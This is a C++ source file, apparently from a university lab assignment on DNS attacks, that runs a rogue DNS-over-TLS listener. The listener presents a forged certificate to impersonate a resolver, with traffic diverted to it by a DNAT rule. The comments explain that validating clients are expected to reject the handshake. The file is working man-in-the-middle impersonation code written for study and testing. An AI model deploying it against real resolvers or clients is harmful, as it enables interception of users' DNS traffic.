/*
 * tls_endpoint.cpp — Phase 7, §7.3 attempt (ii): impersonate the
 * resolver with a rogue certificate.
 *
 * This is DELIBERATELY NOT a libpcap packet forger, unlike every
 * other attack program in this assignment. Completing a
 * cryptographically valid TLS handshake requires an actual TLS stack
 * negotiating real key material -- there is no way to accomplish that
 * by crafting raw bytes with libpcap, the same way Phases 2-4/6's
 * forgers craft raw DNS bytes. This program uses ordinary POSIX
 * sockets and OpenSSL instead, for this one piece of this assignment
 * only.
 *
 * How traffic reaches it: this program listens directly on the
 * attacker's own address, 172.16.1.100:853. Nothing reaches it unless
 * a DNAT rule on edge-router is manually enabled first (see this
 * phase's README, §7.3 attempt (ii)) -- that rule rewrites the
 * DESTINATION IP of client -> resolver TCP/853 packets to the
 * attacker's own address. That's a deliberate design choice: an
 * earlier draft tried diverting that traffic via routing (the same
 * next-hop technique every other phase uses) and relaying it onward
 * like dns_interceptor.cpp does, but that can't work here -- the
 * attacker has no interface on the resolver's subnet at all, so
 * "relaying onward" would mean handing the packet back to the only
 * router it has, which would just re-apply its own diversion rule to
 * it and loop forever. DNAT avoids this entirely: once the
 * destination IP itself is rewritten, the client's connection
 * terminates at the attacker as a genuinely new, independent TCP
 * connection -- nothing is relayed, so there's nothing to loop.
 *
 * Because nothing reaches this program at all unless that DNAT rule
 * is active, there's no "pass-through / impersonate" mode toggle to
 * get right here (an earlier draft had one): when a connection shows
 * up, it's by definition because someone enabled the attack, so this
 * always presents the rogue certificate. §7.2 Verify and attempts
 * (i)/(iii) never involve this program at all -- their traffic goes
 * directly client <-> resolver, untouched, exactly as normal.
 *
 * For a client that validates properly (both postures in this phase
 * are required to -- the spec disallows -k/insecure-bypass),
 * SSL_accept() below simply fails: the client aborts the handshake
 * before ever sending a query, because the rogue cert doesn't chain
 * to the private CA it trusts. That failure, logged below, IS the
 * expected, correct result -- the interesting finding for the report
 * is that this attempt doesn't work directly against a validating
 * client at all, regardless of its cleartext-fallback posture.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o tls_endpoint tls_endpoint.cpp -lssl -lcrypto -lpthread
 * Usage: ./tls_endpoint
 *   LISTEN_IP env var -- default "172.16.1.100" (the attacker's own address)
 *   ROGUE_CERT / ROGUE_KEY env vars -- default "/app/pki/rogue.crt" / "/app/pki/rogue.key"
 */

#include <openssl/err.h>
#include <openssl/ssl.h>

#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>

namespace {

void handle_connection(int client_fd, SSL_CTX *ctx) {
    fprintf(stderr, "[tls_endpoint] IMPERSONATE: presenting rogue cert for resolver.cs6008.local\n");
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, client_fd);
    const int rc = SSL_accept(ssl);
    if (rc <= 0) {
        fprintf(stderr, "[tls_endpoint] handshake rejected by the client (expected for a client that validates "
                        "the cert chain properly -- our rogue cert isn't signed by the trusted CA)\n");
        ERR_print_errors_fp(stderr);
    } else {
        fprintf(stderr, "[tls_endpoint] !! handshake SUCCEEDED -- a client just accepted an untrusted cert !!\n");
        uint8_t buf[2048];
        SSL_read(ssl, buf, sizeof(buf));
        fprintf(stderr, "[tls_endpoint] (not bothering to craft a well-formed DoT response here -- "
                        "the handshake succeeding at all is already the finding worth reporting)\n");
    }
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client_fd);
}

} // namespace

int main() {
    const char *listen_ip_env = getenv("LISTEN_IP");
    const std::string listen_ip = listen_ip_env ? listen_ip_env : "172.16.1.100";
    const char *cert_env = getenv("ROGUE_CERT");
    const std::string cert_path = cert_env ? cert_env : "/app/pki/rogue.crt";
    const char *key_env = getenv("ROGUE_KEY");
    const std::string key_path = key_env ? key_env : "/app/pki/rogue.key";

    SSL_library_init();
    SSL_load_error_strings();
    SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
    if (!ctx) { fprintf(stderr, "[tls_endpoint] SSL_CTX_new failed\n"); return 1; }
    if (SSL_CTX_use_certificate_file(ctx, cert_path.c_str(), SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx, key_path.c_str(), SSL_FILETYPE_PEM) <= 0) {
        fprintf(stderr, "[tls_endpoint] could not load rogue cert/key from %s / %s\n", cert_path.c_str(), key_path.c_str());
        ERR_print_errors_fp(stderr);
        return 1;
    }

    const int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) { perror("socket"); return 1; }
    int yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, listen_ip.c_str(), &addr.sin_addr) != 1) {
        fprintf(stderr, "[tls_endpoint] invalid LISTEN_IP %s\n", listen_ip.c_str());
        return 1;
    }
    addr.sin_port = htons(853);
    if (bind(srv, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0) { perror("bind"); return 1; }
    if (listen(srv, 16) < 0) { perror("listen"); return 1; }

    fprintf(stderr, "[tls_endpoint] listening on %s:853 -- only reachable once edge-router's DNAT rule for "
                    "attempt (ii) is manually enabled (see README)\n", listen_ip.c_str());

    while (true) {
        sockaddr_in cliaddr{};
        socklen_t len = sizeof(cliaddr);
        const int fd = accept(srv, reinterpret_cast<sockaddr *>(&cliaddr), &len);
        if (fd < 0) continue;
        std::thread(handle_connection, fd, ctx).detach();
    }
}
